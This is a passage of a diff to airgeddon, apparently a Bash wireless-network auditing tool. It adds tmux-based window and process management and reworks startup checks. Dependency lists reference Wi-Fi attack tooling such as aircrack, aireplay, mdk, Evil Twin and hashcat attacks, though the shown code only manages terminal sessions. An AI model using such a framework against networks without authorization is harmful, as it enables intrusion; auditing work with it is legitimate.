+	if hash tmux 2> /dev/null; then
+		tmux kill-session -t "${1}"
+		return 0
+	else
+		return 1
+	fi
+}
+
+#Starting point of airgeddon script inside newly created tmux session
+function start_airgeddon_from_tmux() {
+
+	debug_print
+
+	tmux rename-window -t "${session_name}" "${tmux_main_window}"
+	tmux send-keys -t "${session_name}:${tmux_main_window}" "clear;bash ${scriptfolder}${scriptname}" ENTER
+	sleep 0.2
+	if [ "${1}" = "normal" ]; then
+		tmux attach -t "${session_name}"
+	else
+		tmux switch-client -t "${session_name}"
+	fi
+}
+
+#Create new tmux session exclusively for airgeddon
+function create_tmux_session() {
+
+	debug_print
+
+	session_name="${1}"
+
+	if [ "${2}" = "true" ]; then
+		tmux new-session -d -s "${1}"
+		start_airgeddon_from_tmux "normal"
+	else
+		tmux new-session -d -s "${1}"
+		start_airgeddon_from_tmux "nested"
+	fi
+}
+
+#Start supporting scripts inside its own tmux window
+function start_tmux_processes() {
+
+	debug_print
+
+	local window_name
+	local command_line
+
+	window_name="${1}"
+	command_line="${2}"
+
+	tmux kill-window -t "${session_name}:${window_name}" 2> /dev/null
+	case "${4}" in
+		"active")
+			tmux new-window -t "${session_name}:" -n "${window_name}"
+		;;
+		*)
+			tmux new-window -d -t "${session_name}:" -n "${window_name}"
+		;;
+	esac
+	local tmux_color_cmd
+	if [ -n "${3}" ]; then
+		tmux_color_cmd="bg=#000000 fg=${3}"
+	else
+		tmux_color_cmd="bg=#000000"
+	fi
+	tmux setw -t "${window_name}" window-style "${tmux_color_cmd}"
+	tmux send-keys -t "${session_name}:${window_name}" "${command_line}" ENTER
+}
+
+#Check if script is currently executed inside tmux session or not
+function check_inside_tmux() {
+
+	debug_print
+
+	local parent_pid
+	local parent_window
+	parent_pid=$(ps -o ppid= ${PPID} | tr -d ' ')
+	parent_window="$(ps --no-headers -p "${parent_pid}" -o comm=)"
+	if [[ "${parent_window}" =~ tmux ]]; then
+		return 0
+	fi
+	return 1
+}
+
+#Close any existing tmux session before opening, to avoid conflicts
+#shellcheck disable=SC2009
+function close_existing_airgeddon_tmux_session() {
+
+	debug_print
+
+	if ! check_inside_tmux; then
+		eval "kill -9 $(ps --no-headers aux | grep -i 'tmux.*airgeddon' | awk '{print $2}' | tr '\n' ' ') > /dev/null 2>&1"
+	fi
+}
+
+#Hand over script execution to tmux and call function to create a new session
+function transfer_to_tmux() {
+
+	debug_print
+
+	close_existing_airgeddon_tmux_session
+
+	if ! check_inside_tmux; then
+		create_tmux_session "${session_name}" "true"
+	else
+		local active_session
+		active_session=$(tmux display-message -p '#S')
+		if [ "${active_session}" != "${session_name}" ]; then
+			tmux_error=1
+		fi
+	fi
+}
+
+#Function to kill tmux windows using window name
+function kill_tmux_windows() {
+
+	debug_print
+
+	local TMUX_WINDOWS_LIST=()
+	local current_window_name
+	readarray -t TMUX_WINDOWS_LIST < <(tmux list-windows -t "${session_name}:")
+	for item in "${TMUX_WINDOWS_LIST[@]}"; do
+		[[ "${item}" =~ ^[0-9]+:[[:blank:]](.+([^*-]))([[:blank:]]|\-|\*)[[:blank:]]?\([0-9].+ ]] && current_window_name="${BASH_REMATCH[1]}"
+		if [ "${current_window_name}" = "${tmux_main_window}" ]; then
+			continue
+		fi
+		if [ -n "${1}" ]; then
+			if [ "${current_window_name}" = "${1}" ]; then
+				continue
+			fi
+		fi
+		tmux kill-window -t "${session_name}:${current_window_name}"
+	done
+}
+
+#Function to pause script execution on the main window until a process has finished executing or the user terminates it
+#shellcheck disable=SC2009
+function wait_for_process() {
+
+	debug_print
+
+	local running_process
+	local running_process_pid
+	local running_process_cmd_line
+	running_process_cmd_line=$(echo "${1}" | tr -d '"')
+
+	while [ -z "${running_process_pid}" ]; do
+		running_process_pid=$(ps --no-headers aux | grep "${running_process_cmd_line}" | grep -v "grep ${running_process_cmd_line}" | awk '{print $2}' | tr '\n' ':')
+		if [ -n "${running_process_pid}" ]; then
+			running_process_pid="${running_process_pid%%:*}"
+			running_process="${running_process_pid}"
+		fi
+	done
+
+	while [ -n "${running_process}" ]; do
+		running_process=$(ps aux | grep "${running_process_pid}" | grep -v "grep ${running_process_pid}")
+		sleep 0.2
+	done
+
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+		tmux kill-window -t "${session_name}:${2}"
+	fi
+}
+
+#Function to capture PID of a process started inside tmux and setting it to a global variable
+#shellcheck disable=SC2009
+function get_tmux_process_id() {
+
+	debug_print
+
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
+
+		local process_cmd_line
+		local process_pid
+
+		process_cmd_line=$(echo "${1}" | tr -d '"')
+		while [ -z "${process_pid}" ]; do
+			process_pid=$(ps --no-headers aux | grep "${process_cmd_line}" | grep -v "grep ${process_cmd_line}" | awk '{print $2}')
+		done
+		global_process_pid="${process_pid}"
+	fi
+}
+
+#Centralized function to launch window using xterm/tmux
+function manage_output() {
+
+	debug_print
+
+	local xterm_parameters
+	local tmux_command_line
+	local xterm_command_line
+	local window_name
+	local command_tail
+
+	xterm_parameters="${1}"
+	tmux_command_line="${2}"
+	xterm_command_line="\"${2}\""
+	window_name="${3}"
+	command_tail=" > /dev/null 2>&1 &"
+
+	case "${AIRGEDDON_WINDOWS_HANDLING}" in
+		"tmux")
+			local tmux_color
+			tmux_color=""
+			[[ "${1}" =~ -fg[[:blank:]](\")?(#[0-9a-fA-F]+) ]] && tmux_color="${BASH_REMATCH[2]}"
+			case "${4}" in
+				"active")
+					start_tmux_processes "${window_name}" "clear;${tmux_command_line}" "${tmux_color}" "active"
+				;;
+				*)
+					start_tmux_processes "${window_name}" "clear;${tmux_command_line}" "${tmux_color}"
+				;;
+			esac
+		;;
+		"xterm")
+			eval "xterm ${xterm_parameters} -e ${xterm_command_line}${command_tail}"
+		;;
+	esac
+}
+
 #Script starting point
 function main() {
 
@@ -12867,8 +14536,25 @@ function main() {
 
 	check_language_strings
 
-	check_xwindow_system
-	detect_screen_resolution
+	if [ ${tmux_error} -eq 1 ]; then
+		language_strings "${language}" 86 "title"
+		echo
+		language_strings "${language}" 621 "yellow"
+		language_strings "${language}" 115 "read"
+		create_tmux_session "${session_name}" "false"
+
+		exit_code=1
+		exit ${exit_code}
+	fi
+
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+		check_xwindow_system
+		detect_screen_resolution
+	fi
+
+	iptables_nftables_detection
+	set_mdk_version
+	dependencies_modifications
 	set_possible_aliases
 	initialize_optional_tools_values
 
@@ -12900,18 +14586,20 @@ function main() {
 		check_bash_version
 		check_root_permissions
 
-		echo
-		if [[ ${resolution_detected} -eq 1 ]] && [[ "${xterm_ok}" -eq 1 ]]; then
-			language_strings "${language}" 294 "blue"
-		else
-			if [ "${xterm_ok}" -eq 0 ]; then
-				language_strings "${language}" 476 "red"
-				exit_code=1
-				exit_script_option
+		if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+			echo
+			if [[ ${resolution_detected} -eq 1 ]] && [[ "${xterm_ok}" -eq 1 ]]; then
+				language_strings "${language}" 294 "blue"
 			else
-				language_strings "${language}" 295 "red"
-				echo
-				language_strings "${language}" 300 "yellow"
+				if [ "${xterm_ok}" -eq 0 ]; then
+					language_strings "${language}" 476 "red"
+					exit_code=1
+					exit_script_option
+				else
+					language_strings "${language}" 295 "red"
+					echo
+					language_strings "${language}" 300 "yellow"
+				fi
 			fi
 		fi
 
@@ -12927,7 +14615,6 @@ function main() {
 		check_update_tools
 	fi
 
-	iptables_fix
 	print_configuration_vars_issues
 	initialize_extended_colorized_output
 	set_windows_sizes
@@ -12946,13 +14633,6 @@ function airmonzc_security_check() {
 		if ! hash ethtool 2> /dev/null; then
 			echo
 			language_strings "${language}" 247 "red"
-			echo
-			language_strings "${language}" 115 "read"
-			exit_code=1
-			exit_script_option
-		elif ! hash lspci 2> /dev/null; then
-			echo
-			language_strings "${language}" 301 "red"
 			echo
 			language_strings "${language}" 115 "read"
 			exit_code=1
@@ -13006,6 +14686,10 @@ function download_last_version() {
 	if [ "${script_file_downloaded}" -eq 1 ]; then
 
 		download_pins_database_file
+
+		update_options_config_file "getdata"
+		download_options_config_file
+		update_options_config_file "writedata"
 
 		echo
 		language_strings "${language}" 214 "yellow"
@@ -13195,17 +14879,6 @@ function autoupdate_check() {
 	language_strings "${language}" 115 "read"
 }
 
-#Check if you can launch captive portal Evil Twin attack
-function check_et_without_internet_compatibility() {
-
-	debug_print
-
-	if ! hash "${optional_tools_names[12]}" 2> /dev/null; then
-		return 1
-	fi
-	return 0
-}
-
 #Change script language automatically if OS language is supported by the script and different from current language
 function autodetect_language() {
 
@@ -13230,7 +14903,7 @@ function remove_warnings() {
 	echo "${clean_handshake_dependencies[@]}" > /dev/null 2>&1
 	echo "${aircrack_attacks_dependencies[@]}" > /dev/null 2>&1
 	echo "${aireplay_attack_dependencies[@]}" > /dev/null 2>&1
-	echo "${mdk3_attack_dependencies[@]}" > /dev/null 2>&1
+	echo "${mdk_attack_dependencies[@]}" > /dev/null 2>&1
 	echo "${hashcat_attacks_dependencies[@]}" > /dev/null 2>&1
 	echo "${et_onlyap_dependencies[@]}" > /dev/null 2>&1
 	echo "${et_sniffing_dependencies[@]}" > /dev/null 2>&1
@@ -13247,6 +14920,7 @@ function remove_warnings() {
 	echo "${asleap_attacks_dependencies[@]}" > /dev/null 2>&1
 	echo "${john_attacks_dependencies[@]}" > /dev/null 2>&1
 	echo "${johncrunch_attacks_dependencies[@]}" > /dev/null 2>&1
+	echo "${enterprise_certificates_dependencies[@]}" > /dev/null 2>&1
 	echo "${is_arm}" > /dev/null 2>&1
 }
 
